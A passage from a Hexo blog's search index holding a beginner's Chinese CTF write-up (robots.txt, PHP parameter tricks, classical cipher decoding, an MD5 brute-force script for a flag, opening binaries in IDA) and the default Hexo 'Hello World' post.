src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011958.png"></p><h2 id="二、Robots"><a href="#二、Robots" class="headerlink" title="二、Robots"></a>二、Robots</h2><p>通过robots网上可得知爬虫协议，即将网站后面加上&#x2F;robots，如图<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012570.png"><br>再通过此修改得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012048.png"></p><h2 id="三、PHP01"><a href="#三、PHP01" class="headerlink" title="三、PHP01"></a>三、PHP01</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012230.png"><br>根据对此分析得到get应传的参，如图所示，得到flag。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012518.png"></p><h2 id="四、PHP02"><a href="#四、PHP02" class="headerlink" title="四、PHP02"></a>四、PHP02</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012693.png">首先这题提示只要访问flag.php就能得到答案，但是如果你单纯输出flag.php会出现如下图的情况<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012756.png">所以可以从中得到规律，进行以下的修改，得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012269.png"></p><h2 id="CPYPTO"><a href="#CPYPTO" class="headerlink" title="CPYPTO"></a>CPYPTO</h2><h2 id="一、base家族"><a href="#一、base家族" class="headerlink" title="一、base家族"></a>一、base家族</h2><p>打开附件得到一串码，根据题目，考虑base解密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012305.png"><br>考虑到可能是base的层层加密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012449.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012170.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012548.png"><br>工具链接:<a href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a></p><h2 id="二、O欢迎来到SLsec！，ok"><a href="#二、O欢迎来到SLsec！，ok" class="headerlink" title="二、O欢迎来到SLsec！，ok"></a>二、O欢迎来到SLsec！，ok</h2><p>打开文本得到一堆重复乱码，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012161.png"><br>根据题目考虑到ook解密，将SLsec改成Ook后得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013162.png"><br>ook解密链接:<a href="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a></p><h2 id="三、小兔兔找朋友"><a href="#三、小兔兔找朋友" class="headerlink" title="三、小兔兔找朋友"></a>三、小兔兔找朋友</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012922.png"><br>此题要根据题目来做，首先是小兔子过生日，当天为光棍节，所以密钥为1111，通过兔兔想到兔子解密，兔子解密后栅栏数为三的栅栏解密以及最后的凯撒解密得到答案，步骤如下<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012392.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012918.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013703.png"><br>RABBIT解密链接:<a href="https://www.codeeeee.com/encrypt/rabbit.html">https://www.codeeeee.com/encrypt/rabbit.html</a></p><h2 id="四、MD5解密"><a href="#四、MD5解密" class="headerlink" title="四、MD5解密"></a>四、MD5解密</h2><p>该题是通过一串代码得到的答案，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013584.png"><br>再用SLsec包装即是答案。</p><p>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">#print hashlib.md5(s).hexdigest().upper()`</span><br><span class="line">k = &#x27;SLsec&#123;md5&amp;zd&amp;mj&amp;m&#125;&#x27;</span><br><span class="line">for i in range(26):</span><br><span class="line">    temp1 = k.replace(&#x27;&amp;&#x27;,str(chr(97+i)),1) #用ascii开始，从A开始查</span><br><span class="line">    for j in range(26):</span><br><span class="line">        temp2 = temp1.replace(&#x27;&amp;&#x27;,chr(97+j),1)</span><br><span class="line">        for n in range(26):``</span><br><span class="line">            temp3 = temp2.replace(&#x27;&amp;&#x27;,chr(97+n),1)</span><br><span class="line">            s = hashlib.md5(temp3.encode(&#x27;utf8&#x27;)).hexdigest().upper()#注意大小写</span><br><span class="line">            if s[:32] == &#x27;D1ABA2C785779AFFFBEC56422DBF23F2&#x27;:#检查元素</span><br><span class="line">                print(temp3)</span><br></pre></td></tr></table></figure><p>源代码链接：<a href="https://blog.csdn.net/emmmk_suibian/article/details/123693217">https://blog.csdn.net/emmmk_suibian&#x2F;article&#x2F;details&#x2F;123693217</a></p><h2 id="RESERVE"><a href="#RESERVE" class="headerlink" title="RESERVE"></a>RESERVE</h2><h2 id="一、re签到"><a href="#一、re签到" class="headerlink" title="一、re签到"></a>一、re签到</h2><p>将附件放入ida就能找到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013050.png"></p><h2 id="二、JustCaesar"><a href="#二、JustCaesar" class="headerlink" title="二、JustCaesar"></a>二、JustCaesar</h2><p>第二题同样是exe文件，所以通过ida打开这个压缩包<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013701.png"><br>得到一串代码，通过题目提示凯撒，所以进行凯撒解密得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013803.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 新手、网安学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/01/07/hello-world/"/>
      <url>/2023/01/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
